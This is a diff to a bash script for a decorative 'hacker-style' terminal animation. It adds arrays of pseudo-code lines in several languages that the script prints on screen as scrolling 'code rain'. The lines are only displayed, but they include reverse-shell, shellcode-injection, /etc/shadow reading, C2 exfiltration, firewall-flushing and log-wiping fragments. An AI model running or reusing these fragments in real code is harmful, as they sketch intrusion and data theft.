@@ -82,40 +82,258 @@ progress_bar() {
     printf "]${N} ${G}%3d%% ✓${N}\n" 100
 }
 
-CHARSETS=(
-    "01アイウエオカキクケコ@#\$%&"
-    "01абвгдежзик@#\$%&"
-    "01你好世界黑客入侵@#\$%&"
-    "01αβγδεζηθικ@#\$%&"
-    "01♠♣♥♦★☆◆◇○●@#\$%&"
-    "01بتثجحخدذرز@#\$%&"
-    "01가나다라마바사아자차@#\$%&"
-    "01∑∏∫∂√∞≈≠±@#\$%&"
+# Code snippets per language — each machine uses a different language
+ASM_LINES=(
+    "  MOV AX, 0x4C00"
+    "  INT 21h"
+    "  PUSH EBP"
+    "  MOV EBP, ESP"
+    "  SUB ESP, 0x40"
+    "  XOR EAX, EAX"
+    "  LEA EDX, [EBP-0x20]"
+    "  CMP BYTE [ESI], 0"
+    "  JNZ .loop_start"
+    "  CALL _inject_payload"
+    "  RET"
+    "  POP EBX"
+    "  NOP"
+    "  JMP SHORT .next"
+    "  MOV ECX, [EBP+8]"
+    "  TEST EAX, EAX"
+    "  SHL EDX, 4"
+    "  AND EAX, 0xFF"
+    "  OR ECX, EDX"
+    "  RETN 0x10"
+    "  DB 0x90, 0x90, 0x90"
+    "  MOV DWORD [ESP], offset shellcode"
+    "  LOOP .decrypt_block"
+    "  XCHG EAX, EDX"
+    "  INC ESI"
+    "  DEC ECX"
+    "  SHR EAX, 1"
+    "  ADC EDX, 0"
+    "  STOSB"
+    "  REP MOVSB"
 )
-RAIN_CHARS="${CHARSETS[$ART_SEED]}"
+
+C_LINES=(
+    "  void *buf = mmap(NULL, 4096, 7, 0x22, -1, 0);"
+    "  memcpy(buf, shellcode, sizeof(shellcode));"
+    "  ((void(*)())buf)();"
+    "  int fd = socket(AF_INET, SOCK_STREAM, 0);"
+    "  connect(fd, (struct sockaddr*)&sa, sizeof(sa));"
+    "  dup2(fd, STDIN_FILENO);"
+    "  execve(\"/bin/sh\", args, NULL);"
+    "  char *key = getenv(\"API_SECRET\");"
+    "  if (ptrace(PTRACE_TRACEME, 0) < 0) exit(1);"
+    "  fork() && wait(NULL);"
+    "  setsid();"
+    "  signal(SIGCHLD, SIG_IGN);"
+    "  while(recv(sock, &cmd, 1, 0) > 0) {"
+    "  pid_t pid = fork();"
+    "  struct stat st;"
+    "  fstat(fd, &st);"
+    "  unsigned char *mapped = mmap(0, st.st_size,"
+    "      PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);"
+    "  for(int i=0; i<len; i++) buf[i] ^= key[i%klen];"
+    "  sendto(sock, packet, pktlen, 0,"
+    "      (struct sockaddr*)&dest, sizeof(dest));"
+    "  close(fd);"
+    "  free(buf);"
+    "  return 0;"
+    "  #include <sys/ptrace.h>"
+    "  #define PAYLOAD_SZ 0x200"
+    "  typedef struct { int type; char data[256]; } msg_t;"
+    "  ssize_t n = read(fd, buf, sizeof(buf));"
+    "  write(STDOUT_FILENO, response, strlen(response));"
+    "  chmod(\"/tmp/.backdoor\", 0755);"
+)
+
+CPP_LINES=(
+    "  auto conn = std::make_unique<SSHClient>(host, 22);"
+    "  conn->authenticate(stolen_key);"
+    "  auto proc = conn->exec(\"cat /etc/shadow\");"
+    "  std::vector<uint8_t> payload(4096);"
+    "  std::copy(shellcode.begin(), shellcode.end(),"
+    "            payload.begin());"
+    "  auto exfil = new DataExfiltrator(c2_server);"
+    "  exfil->upload(database_dump, AES_256_GCM);"
+    "  delete exfil;"
+    "  class RootKit : public KernelModule {"
+    "    void inject() override {"
+    "      hook_syscall(SYS_open, &fake_open);"
+    "    }"
+    "  };"
+    "  std::thread(scan_network, subnet).detach();"
+    "  catch (std::exception& e) {"
+    "    log_error(e.what());"
+    "  }"
+    "  template<typename T>"
+    "  T decrypt(const std::vector<uint8_t>& cipher) {"
+    "    return AES::decrypt<T>(cipher, master_key);"
+    "  }"
+    "  std::mutex mtx;"
+    "  std::lock_guard<std::mutex> lock(mtx);"
+    "  for (auto& target : network_hosts) {"
+    "    if (target.is_vulnerable()) exploit(target);"
+    "  }"
+    "  std::filesystem::remove_all(\"/var/log\");"
+    "  auto fut = std::async(std::launch::async, crack_hash);"
+    "  std::cout << \"[+] Persistence installed\" << std::endl;"
+    "  return EXIT_SUCCESS;"
+)
+
+PASCAL_LINES=(
+    "  program ExploitFramework;"
+    "  uses SysUtils, Sockets, Classes;"
+    "  var sock: TSocket;"
+    "  begin"
+    "    sock := fpSocket(AF_INET, SOCK_STREAM, 0);"
+    "    fpConnect(sock, @addr, sizeof(addr));"
+    "    WriteLn('ACCESS GRANTED');"
+    "    AssignFile(f, '/etc/passwd');"
+    "    Reset(f);"
+    "    while not EOF(f) do begin"
+    "      ReadLn(f, line);"
+    "      fpSend(sock, @line[1], Length(line), 0);"
+    "    end;"
+    "    CloseFile(f);"
+    "    fpClose(sock);"
+    "  end."
+    "  procedure InjectShellcode(addr: Pointer);"
+    "  var p: PByte;"
+    "  begin"
+    "    p := VirtualAlloc(nil, 4096, $3000, $40);"
+    "    Move(shellcode[0], p^, Length(shellcode));"
+    "    asm CALL p end;"
+    "  end;"
+    "  function DecryptPayload(data: TBytes): TBytes;"
+    "  type TKeyring = record"
+    "    master: array[0..31] of Byte;"
+    "    iv: array[0..15] of Byte;"
+    "  end;"
+    "  if FileExists('/tmp/.persistence') then"
+    "    raise Exception.Create('Rootkit active');"
+    "  Result := XorCrypt(data, key);"
+)
+
+JS_LINES=(
+    "  const net = require('net');"
+    "  const sock = new net.Socket();"
+    "  sock.connect(4444, c2Server, () => {"
+    "    const sh = spawn('/bin/sh', ['-i']);"
+    "    sh.stdout.pipe(sock);"
+    "    sock.pipe(sh.stdin);"
+    "  });"
+    "  const crypto = require('crypto');"
+    "  const key = crypto.randomBytes(32);"
+    "  const cipher = crypto.createCipheriv('aes-256-gcm',"
+    "    key, iv);"
+    "  let encrypted = cipher.update(stolen_data, 'utf8',"
+    "    'hex');"
+    "  encrypted += cipher.final('hex');"
+    "  await fetch(c2 + '/exfil', {"
+    "    method: 'POST',"
+    "    body: JSON.stringify({ data: encrypted }),"
+    "    headers: { 'X-Bot-Id': botId }"
+    "  });"
+    "  const fs = require('fs');"
+    "  fs.readFileSync('/etc/shadow', 'utf8');"
+    "  process.env.API_KEY = undefined;"
+    "  const { execSync } = require('child_process');"
+    "  execSync('iptables -F');"
+    "  console.log('[+] Firewall flushed');"
+    "  setInterval(() => beacon(c2), 30000);"
+    "  module.exports = { exploit, persist, clean };"
+    "  async function* scanPorts(host) {"
+    "    for (let p = 1; p < 65536; p++) yield probe(host, p);"
+    "  }"
+)
+
+LINGO_LINES=(
+    "  on startMovie"
+    "    global gTarget, gPayload"
+    "    set gTarget = the machineType"
+    "    put \"BREACH ACTIVE\" into field \"status\""
+    "  end"
+    "  on mouseDown"
+    "    set the ink of sprite 1 to 36"
+    "    puppetSound \"modem_handshake\""
+    "  end"
+    "  on enterFrame"
+    "    if the timer > 60 then"
+    "      go to frame \"exfiltrate\""
+    "    end if"
+    "  end"
+    "  on exitFrame"
+    "    set data = getProp(gStolenKeys, #ssh)"
+    "    sendData(gC2server, data)"
+    "    go to the frame"
+    "  end"
+    "  put the number of chars in field \"passwd\" into n"
+    "  repeat with i = 1 to n"
+    "    put charToNum(char i of field \"passwd\") into c"
+    "    put numToChar(bitXor(c, 42)) after result"
+    "  end repeat"
+    "  set the locH of sprite 10 to random(800)"
+    "  set the visible of member \"rootkit\" to TRUE"
+    "  set the text of member \"log\" to RETURN & \"[+] DONE\""
+    "  on inject target"
+    "    do \"set x = \" & target & \".payload\""
+    "  end"
+)
+
+# Pick language per machine
+ALL_CODE_LINES=()
+case $((ART_SEED % 6)) in
+    0) ALL_CODE_LINES=("${ASM_LINES[@]}") ;;
+    1) ALL_CODE_LINES=("${C_LINES[@]}") ;;
+    2) ALL_CODE_LINES=("${CPP_LINES[@]}") ;;
+    3) ALL_CODE_LINES=("${PASCAL_LINES[@]}") ;;
+    4) ALL_CODE_LINES=("${JS_LINES[@]}") ;;
+    5) ALL_CODE_LINES=("${LINGO_LINES[@]}") ;;
+esac
+CODE_COUNT=${#ALL_CODE_LINES[@]}
+
+# Secondary language for variety (offset by 3)
+ALL_CODE_LINES2=()
+case $(( (ART_SEED + 3) % 6 )) in
+    0) ALL_CODE_LINES2=("${ASM_LINES[@]}") ;;
+    1) ALL_CODE_LINES2=("${C_LINES[@]}") ;;
+    2) ALL_CODE_LINES2=("${CPP_LINES[@]}") ;;
+    3) ALL_CODE_LINES2=("${PASCAL_LINES[@]}") ;;
+    4) ALL_CODE_LINES2=("${JS_LINES[@]}") ;;
+    5) ALL_CODE_LINES2=("${LINGO_LINES[@]}") ;;
+esac
+CODE2_COUNT=${#ALL_CODE_LINES2[@]}
+
+CODE_IDX=0
 
 matrix_transition() {
-    # Short burst of matrix rain as transition between phases
-    local lines="${1:-8}"
-    echo -e "${G}"
-    for ((l=0; l<lines; l++)); do
-        line=""
-        for ((i=0; i<COLS; i++)); do
-            r=$((RANDOM % 5))
-            if [ $r -eq 0 ]; then
-                line+="$(printf '%x' $((RANDOM % 16)))"
-            elif [ $r -le 2 ]; then
-                line+=" "
-            elif [ $r -eq 3 ]; then
-                line+="${RAIN_CHARS:$((RANDOM % ${#RAIN_CHARS})):1}"
+    # Full-screen code rain filling the terminal
+    local ROWS=$(tput lines 2>/dev/null || echo 24)
+    local colors=("${G}" "${D}" "${DG}" "${C}" "${G}" "${D}")
+    for ((l=0; l<ROWS; l++)); do
+        local color="${colors[$((RANDOM % ${#colors[@]}))]}"
+        # Alternate between code lines and hex noise
+        if (( RANDOM % 3 != 0 )); then
+            # Code line from primary or secondary language
+            if (( RANDOM % 2 == 0 )); then
+                echo -e "${color}${ALL_CODE_LINES[$((CODE_IDX % CODE_COUNT))]}${N}"
             else
-                line+="$(printf '%x' $((RANDOM % 256)))"
+                echo -e "${color}${ALL_CODE_LINES2[$((CODE_IDX % CODE2_COUNT))]}${N}"
             fi
-        done
-        echo "$line"
-        sleep 0.04
+            CODE_IDX=$((CODE_IDX + 1))
+        else
+            # Hex/address noise line
+            printf "${DG}0x%08x: " $((RANDOM * RANDOM))
+            for ((w=0; w<6; w++)); do
+                printf "%02x%02x " $((RANDOM % 256)) $((RANDOM % 256))
+            done
+            printf "${N}\n"
+        fi
+        sleep 0.03
     done
-    echo -e "${N}"
 }
 
 log_line() {
